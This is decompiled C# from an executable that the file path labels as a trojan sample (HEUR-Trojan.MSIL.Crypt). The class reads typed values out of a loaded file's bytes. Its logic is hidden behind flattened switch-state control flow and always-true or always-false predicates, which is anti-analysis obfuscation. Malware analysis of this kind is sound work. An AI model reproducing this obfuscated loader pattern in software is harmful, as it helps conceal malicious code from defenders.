// Decompiled with JetBrains decompiler
// Type: Tourield.Attributes.TestsWrapperAttribute
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Pages;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace Tourield.Attributes
{
  public class TestsWrapperAttribute
  {
    private byte[] _MapperWrapper;
    private int processWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public byte[] FindPrototype() => this._MapperWrapper;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CustomizePrototype(string init)
    {
      this._MapperWrapper = File.ReadAllBytes(init);
      this.processWrapper = 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InsertPrototype(int value) => this.processWrapper = value;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ForgotPrototype()
    {
      if (this.processWrapper >= this._MapperWrapper.Length)
        throw new EndOfStreamException();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public byte EnablePrototype() => this.ResetPrototype(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public byte ResetPrototype(bool iskey)
    {
      int num1 = 5;
      bool flag;
      byte num2;
      byte num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            num2 = this._MapperWrapper[this.processWrapper];
            num1 = 3;
            continue;
          case 2:
          case 3:
            flag = iskey;
            goto case 4;
          case 4:
            if (flag)
              ++this.processWrapper;
            num3 = num2;
            num1 = 6;
            continue;
          case 5:
            this.ForgotPrototype();
            num1 = 0;
            continue;
          case 6:
            goto label_9;
          default:
            num1 = 4;
            continue;
        }
      }
label_9:
      return num3;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool OrderPrototype() => this.CalcPrototype(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool CalcPrototype(bool islast)
    {
      int num1 = 3;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        bool boolean;
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              this.ForgotPrototype();
              if (TestsWrapperAttribute.LogoutMethod())
              {
                num2 = 1;
                continue;
              }
              goto label_2;
            case 1:
              goto label_2;
            case 2:
            case 4:
label_5:
              if (!flag2)
                break;
              goto case 5;
            case 5:
              ++this.processWrapper;
              break;
            case 6:
              goto label_10;
            default:
              goto label_8;
          }
          flag1 = boolean;
          if (true)
            num2 = 6;
          else
            goto label_5;
        }
label_2:
        boolean = BitConverter.ToBoolean(this._MapperWrapper, this.processWrapper);
        flag2 = islast;
        num1 = 4;
        continue;
label_8:
        num1 = 5;
      }
label_10:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public double VisitPrototype() => this.QueryPrototype(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public double QueryPrototype(bool rejectident)
    {
      int num1 = 1;
      double num2;
      while (true)
      {
        double num3;
        bool flag;
        int num4;
        switch (num1)
        {
          case 0:
          case 1:
            this.ForgotPrototype();
            num4 = 5;
            break;
          case 2:
          case 3:
            if (flag)
            {
              this.processWrapper += 8;
              goto case 4;
            }
            else
              goto case 4;
          case 4:
            num2 = num3;
            num1 = 6;
            continue;
          case 5:
            num3 = BitConverter.ToDouble(this._MapperWrapper, this.processWrapper);
            flag = rejectident;
            num4 = 3;
            break;
          case 6:
            goto label_9;
          default:
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto case 0;
        }
        num1 = num4;
      }
label_9:
      return num2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public int FillPrototype() => this.CallPrototype(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public int CallPrototype(bool haveinit)
    {
      int num1 = 3;
      int num2;
      while (true)
      {
        int num3 = num1;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 2:
              goto label_4;
            case 1:
            case 4:
              goto label_2;
            case 3:
              goto label_8;
            case 5:
              goto label_1;
            case 6:
              goto label_9;
            default:
              num3 = 5;
              continue;
          }
        }
label_1:
        int int32;
        num2 = int32;
        num1 = 6;
        continue;
label_2:
        int32 = BitConverter.ToInt32(this._MapperWrapper, this.processWrapper);
        if (haveinit)
        {
          num1 = 0;
          continue;
        }
        goto label_1;
label_4:
        this.processWrapper += 4;
        goto label_1;
label_8:
        this.ForgotPrototype();
        num1 = 4;
      }
label_9:
      return num2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string ChangePrototype() => this.RatePrototype(Encoding.Default, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string PostPrototype(Encoding item) => this.RatePrototype(item, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string MapPrototype(bool isspec) => this.RatePrototype(Encoding.Default, isspec);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string RatePrototype(Encoding instance, bool isb)
    {
      int num1 = 3;
      if (true)
        goto label_5;
label_1:
      int count;
      this.processWrapper += count;
label_2:
      string str1;
      string str2 = str1;
      int num2 = 6;
label_4:
      num1 = num2;
label_5:
      bool flag;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            count = this.CallPrototype(isb);
            str1 = instance.GetString(this._MapperWrapper, this.processWrapper + (isb ? 0 : 4), count);
            flag = isb;
            num1 = 4;
            continue;
          case 2:
          case 4:
            goto label_3;
          case 3:
            goto label_8;
          case 5:
            goto label_1;
          case 6:
            goto label_9;
          default:
            goto label_6;
        }
      }
label_3:
      if (!flag)
        goto label_2;
      else
        goto label_1;
label_6:
      num2 = 5;
      goto label_4;
label_8:
      this.ForgotPrototype();
      num2 = 0;
      goto label_4;
label_9:
      return str2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public uint ReadPrototype() => this.SetPrototype(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public uint SetPrototype(bool isasset)
    {
      int num1 = 5;
      if (!TestsWrapperAttribute.OrderMethod())
        goto label_3;
label_1:
      bool flag = isasset;
      goto label_7;
label_2:
      int num2;
      num1 = num2;
label_3:
      uint uint32;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            goto label_5;
          case 1:
            goto label_1;
          case 2:
            uint32 = BitConverter.ToUInt32(this._MapperWrapper, this.processWrapper);
            num1 = 1;
            continue;
          case 3:
          case 4:
            goto label_7;
          case 6:
            goto label_10;
          default:
            num1 = 4;
            continue;
        }
      }
label_5:
      this.ForgotPrototype();
      num2 = 2;
      goto label_2;
label_10:
      uint num3;
      return num3;
label_7:
      if (flag)
        this.processWrapper += 4;
      num3 = uint32;
      num2 = 6;
      goto label_2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ulong ExcludePrototype() => this.CalculatePrototype(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ulong CalculatePrototype(bool removei)
    {
      int num = 5;
      if (true)
        goto label_6;
label_1:
      ulong uint64;
      ulong prototype = uint64;
      num = 6;
label_6:
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_1;
          case 1:
          case 4:
            uint64 = BitConverter.ToUInt64(this._MapperWrapper, this.processWrapper);
            flag = removei;
            num = 3;
            continue;
          case 2:
          case 3:
            goto label_4;
          case 5:
            this.ForgotPrototype();
            num = 4;
            continue;
          case 6:
            goto label_8;
          default:
            num = 0;
            continue;
        }
      }
label_4:
      if (flag)
      {
        this.processWrapper += 8;
        goto label_1;
      }
      else
        goto label_1;
label_8:
      return prototype;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public DateTime RestartPrototype() => this.WritePrototype(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public DateTime WritePrototype(bool istask)
    {
      int num1 = 4;
      double num2;
      DateTime dateTime;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            this.ForgotPrototype();
            num1 = 2;
            continue;
          case 1:
          case 2:
            num2 = this.QueryPrototype(istask);
            goto case 3;
          case 3:
            dateTime = new DateTime(1899, 12, 30, 0, 0, 0) + TimeSpan.FromDays(num2);
            num1 = 5;
            continue;
          case 5:
            goto label_6;
          default:
            if (TestsWrapperAttribute.LogoutMethod())
            {
              num1 = 3;
              continue;
            }
            goto label_6;
        }
      }
label_6:
      return dateTime;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public TestsWrapperAttribute()
    {
      RegistryPagePage.ListMethod();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool LogoutMethod() => true;

    internal static bool OrderMethod() => false;
  }
}
